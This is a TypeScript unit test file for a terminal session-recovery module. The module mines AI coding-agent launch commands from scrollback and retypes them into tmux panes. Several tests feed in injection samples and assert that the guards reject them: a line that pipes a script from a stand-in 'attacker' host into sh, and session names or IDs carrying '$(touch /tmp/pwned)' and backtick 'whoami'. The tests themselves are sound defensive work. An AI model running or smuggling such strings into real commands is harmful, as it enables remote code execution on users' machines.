/**
 * sessionRecovery unit tests.
 *
 * Mocks ptyClient (no real tmux) and terminalsStore identity calls (no real
 * ps/tmux), uses a real in-memory DB for terminal_records + run-events so the
 * mine-from-history path is exercised end-to-end.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

vi.mock('./ptyClient', () => ({
  spawnTerminal: vi.fn(async () => ({ alive: true })),
  writeInput: vi.fn(),
  listTerminals: vi.fn(async () => [] as string[])
}));

vi.mock('./terminalsStore', async () => {
  const actual = await vi.importActual<typeof import('./terminalsStore')>('./terminalsStore');
  return {
    ...actual,
    getTerminalById: vi.fn(),
    setTerminalStatus: vi.fn(() => true),
    autoRegisterTerminalForSpawnedSession: vi.fn(() => null)
  };
});

import {
  extractLastAgentCommand,
  resolveRecoveryCommand,
  recoverSession
} from './sessionRecovery';
import { spawnTerminal, writeInput, listTerminals } from './ptyClient';
import {
  getTerminalById,
  setTerminalStatus,
  autoRegisterTerminalForSpawnedSession
} from './terminalsStore';
import { createTerminalRecord, getTerminalRecord } from './terminalRecordsStore';
import { appendTerminalRunEvent } from './terminalRunEventsStore';
import { resetIdentityDbForTests } from './db';

let tmpDir: string;
const previousDbEnv = process.env.ANT_FRESH_DB_PATH;

beforeEach(() => {
  tmpDir = mkdtempSync(join(tmpdir(), 'ant-recover-'));
  process.env.ANT_FRESH_DB_PATH = join(tmpDir, 'test.db');
  resetIdentityDbForTests();
  vi.mocked(spawnTerminal).mockClear().mockResolvedValue({ alive: true });
  vi.mocked(writeInput).mockClear();
  vi.mocked(listTerminals).mockClear().mockResolvedValue([]);
  vi.mocked(getTerminalById).mockReset().mockReturnValue(null);
  vi.mocked(setTerminalStatus).mockClear().mockReturnValue(true);
  vi.mocked(autoRegisterTerminalForSpawnedSession).mockClear().mockReturnValue(null);
});

afterEach(() => {
  resetIdentityDbForTests();
  rmSync(tmpDir, { recursive: true, force: true });
  if (previousDbEnv === undefined) delete process.env.ANT_FRESH_DB_PATH;
  else process.env.ANT_FRESH_DB_PATH = previousDbEnv;
});

describe('extractLastAgentCommand', () => {
  it('mines the most-recent launch line from raw scrollback', () => {
    createTerminalRecord({ sessionId: 't1', name: 'speedyClaude', agentKind: 'claude_code' });
    appendTerminalRunEvent({ terminalId: 't1', kind: 'raw', text: 'some boot noise\n', trust: 'raw' });
    appendTerminalRunEvent({
      terminalId: 't1', kind: 'raw', trust: 'raw',
      text: 'user@mac ~/proj $ claude --dangerously-skip-permissions --remote-control\n'
    });
    expect(extractLastAgentCommand('t1', 'claude_code')).toBe(
      'claude --dangerously-skip-permissions --remote-control'
    );
  });

  it('rejects a mined line carrying shell metacharacters (RCE guard)', () => {
    createTerminalRecord({ sessionId: 't_evil', name: 'evil', agentKind: 'claude_code' });
    appendTerminalRunEvent({
      terminalId: 't_evil', kind: 'raw', trust: 'raw',
      text: '$ claude --remote-control; curl http://attacker/x.sh | sh\n'
    });
    // The poisoned line must not become a recovery command.
    expect(extractLastAgentCommand('t_evil', 'claude_code')).toBeNull();
  });

  it('returns null when no agent launch line is present', () => {
    createTerminalRecord({ sessionId: 't2', name: 'plain', agentKind: 'claude_code' });
    appendTerminalRunEvent({ terminalId: 't2', kind: 'raw', text: 'ls -la\ncd /tmp\n', trust: 'raw' });
    expect(extractLastAgentCommand('t2', 'claude_code')).toBeNull();
  });
});

describe('resolveRecoveryCommand', () => {
  it('prefers the stored boot_command over mined history', () => {
    createTerminalRecord({ sessionId: 't3', name: 'n', agentKind: 'claude_code', bootCommand: 'claude --foo' });
    appendTerminalRunEvent({ terminalId: 't3', kind: 'raw', text: '$ claude --bar\n', trust: 'raw' });
    const rec = getTerminalRecord('t3')!;
    expect(resolveRecoveryCommand(rec)).toBe('claude --foo');
  });

  it('appends --resume "<base name>" when resume is set', () => {
    createTerminalRecord({ sessionId: 't4', name: 'speedyClaude', agentKind: 'claude_code', bootCommand: 'claude --remote-control' });
    const rec = getTerminalRecord('t4')!;
    expect(resolveRecoveryCommand(rec, { resume: true })).toBe(
      'claude --remote-control --resume "speedyClaude"'
    );
  });

  it('prefers --resume <stored cli_session_id> over the base name when captured', () => {
    // Session capture (2026-06-10): /api/cli-hook persisted the CLI's real
    // session UUID at SessionStart — resume-by-id always resolves, while
    // resume-by-name only works when the CLI session is named after the
    // terminal.
    createTerminalRecord({
      sessionId: 't_cli_sess',
      name: 'speedyClaude',
      agentKind: 'claude_code',
      bootCommand: 'claude --remote-control',
      cliSessionId: 'b6e2f1a0-1234-4cde-9f00-abcdef012345',
      cliSessionSource: 'claude-code'
    });
    const rec = getTerminalRecord('t_cli_sess')!;
    expect(resolveRecoveryCommand(rec, { resume: true })).toBe(
      'claude --remote-control --resume "b6e2f1a0-1234-4cde-9f00-abcdef012345"'
    );
  });

  it('falls back to the base name when the stored cli_session_id is not shell-inert', () => {
    // A poisoned cli_session_id must not reach the typed line — the same
    // allowlist guards every resume target; the safe name is the fallback.
    createTerminalRecord({
      sessionId: 't_cli_sess_evil',
      name: 'speedyClaude',
      agentKind: 'claude_code',
      bootCommand: 'claude --remote-control',
      cliSessionId: 'x$(touch /tmp/pwned)',
      cliSessionSource: 'claude-code'
    });
    const rec = getTerminalRecord('t_cli_sess_evil')!;
    expect(resolveRecoveryCommand(rec, { resume: true })).toBe(
      'claude --remote-control --resume "speedyClaude"'
    );
  });

  it('does NOT append --resume when the name carries shell metacharacters (RCE guard)', () => {
    // The command is typed into the pane shell, so a name like `x$(curl evil|sh)`
    // would execute on recovery if it reached the line. The allowlist rejects it
    // and recovery falls through to a plain relaunch (no by-name resume).
    createTerminalRecord({
      sessionId: 't_inj',
      name: 'x$(touch /tmp/pwned)`whoami`',
      agentKind: 'claude_code',
      bootCommand: 'claude --remote-control'
    });
    const rec = getTerminalRecord('t_inj')!;
    const out = resolveRecoveryCommand(rec, { resume: true });
    expect(out).toBe('claude --remote-control');
    expect(out).not.toContain('--resume');
    expect(out).not.toContain('$(');
    expect(out).not.toContain('`');
  });

  it('does not double-append --resume when already present', () => {
    createTerminalRecord({ sessionId: 't5', name: 'x', agentKind: 'claude_code', bootCommand: 'claude --resume "x"' });
    const rec = getTerminalRecord('t5')!;
    expect(resolveRecoveryCommand(rec, { resume: true })).toBe('claude --resume "x"');
  });

  it('falls back to the per-agent default binary', () => {
    createTerminalRecord({ sessionId: 't6', name: 'c', agentKind: 'codex_cli' });
    const rec = getTerminalRecord('t6')!;
    expect(resolveRecoveryCommand(rec)).toBe('codex');
  });

  it('falls back from canonical hyphenated agent kinds to their launch binaries', () => {
    createTerminalRecord({ sessionId: 't_hyphen_claude', name: 'vc', agentKind: 'claude-code' });
    createTerminalRecord({ sessionId: 't_hyphen_codex', name: 'cx', agentKind: 'codex-cli' });
    createTerminalRecord({ sessionId: 't_hyphen_gemini', name: 'gm', agentKind: 'gemini-cli' });

    expect(resolveRecoveryCommand(getTerminalRecord('t_hyphen_claude')!)).toBe('claude');
    expect(resolveRecoveryCommand(getTerminalRecord('t_hyphen_codex')!)).toBe('codex');
    expect(resolveRecoveryCommand(getTerminalRecord('t_hyphen_gemini')!)).toBe('gemini');
  });

  it('returns null for a bare shell with nothing to launch', () => {
    createTerminalRecord({ sessionId: 't7', name: 's', agentKind: 'generic-shell' });
    const rec = getTerminalRecord('t7')!;
    expect(resolveRecoveryCommand(rec)).toBeNull();
  });
});

describe('recoverSession', () => {
  it('dryRun resolves the command with no side effects', async () => {
    createTerminalRecord({ sessionId: 't8', name: 'n', agentKind: 'claude_code', bootCommand: 'claude --x' });
    const out = await recoverSession('t8', { dryRun: true });
    expect(out.action).toBe('planned');
    expect(out.command).toBe('claude --x');
    expect(vi.mocked(spawnTerminal)).not.toHaveBeenCalled();
    expect(vi.mocked(writeInput)).not.toHaveBeenCalled();
  });

  it('dryRun uses the proposed rename for resume without persisting it', async () => {
    createTerminalRecord({
      sessionId: 't8-rename-dry',
      name: 'oldClaude',
      agentKind: 'claude_code',
      bootCommand: 'claude --remote-control'
    });

    const out = await recoverSession('t8-rename-dry', {
      dryRun: true,
      resume: true,
      renameBySessionId: { 't8-rename-dry': 'newClaude' }
    });

    expect(out).toMatchObject({
      action: 'planned',
      name: 'newClaude',
      renamedFrom: 'oldClaude',
      command: 'claude --remote-control --resume "newClaude"'
    });
    expect(getTerminalRecord('t8-rename-dry')?.name).toBe('oldClaude');
    expect(vi.mocked(spawnTerminal)).not.toHaveBeenCalled();
    expect(vi.mocked(writeInput)).not.toHaveBeenCalled();
  });

  it('skips a missing record', async () => {
    const out = await recoverSession('ghost', {});
    expect(out.action).toBe('skipped');
    expect(out.error).toMatch(/no terminal_records row/);
  });

  it('recreates the pane in last_path, rebinds, and retypes the command', async () => {
    createTerminalRecord({ sessionId: 't9', name: 'speedyClaude', agentKind: 'claude_code', bootCommand: 'claude --remote-control' });
    vi.mocked(getTerminalById).mockReturnValue({ last_path: '/Users/you/proj' } as never);

    const out = await recoverSession('t9', { launchAgent: true });

    expect(out.action).toBe('spawned');
    expect(out.agentLaunched).toBe(true);
    expect(vi.mocked(spawnTerminal)).toHaveBeenCalledWith('t9', { cwd: '/Users/you/proj' });
    expect(vi.mocked(setTerminalStatus)).toHaveBeenCalledWith('t9', 'live');
    expect(vi.mocked(autoRegisterTerminalForSpawnedSession)).toHaveBeenCalledWith({
      sessionId: 't9', tmuxTargetPane: 't9:0.0', agentKind: 'claude_code'
    });
    expect(vi.mocked(writeInput)).toHaveBeenCalledWith('t9', 'claude --remote-control\n');
  });

  it('persists an explicit rename during real recovery before launching', async () => {
    createTerminalRecord({
      sessionId: 't9-rename',
      name: 'oldCodex',
      agentKind: 'codex_cli',
      bootCommand: 'codex'
    });

    const out = await recoverSession('t9-rename', {
      resume: true,
      renameBySessionId: { 't9-rename': 'newCodex' }
    });

    expect(out).toMatchObject({
      action: 'spawned',
      name: 'newCodex',
      renamedFrom: 'oldCodex',
      command: 'codex --resume "newCodex"'
    });
    expect(getTerminalRecord('t9-rename')?.name).toBe('newCodex');
    expect(vi.mocked(writeInput)).toHaveBeenCalledWith('t9-rename', 'codex --resume "newCodex"\n');
  });

  it('reports reattached when the session is already alive', async () => {
    createTerminalRecord({ sessionId: 't10', name: 'a', agentKind: 'claude_code' });
    vi.mocked(listTerminals).mockResolvedValue(['t10']);
    const out = await recoverSession('t10', { launchAgent: false });
    expect(out.action).toBe('reattached');
    expect(vi.mocked(writeInput)).not.toHaveBeenCalled();
  });
});
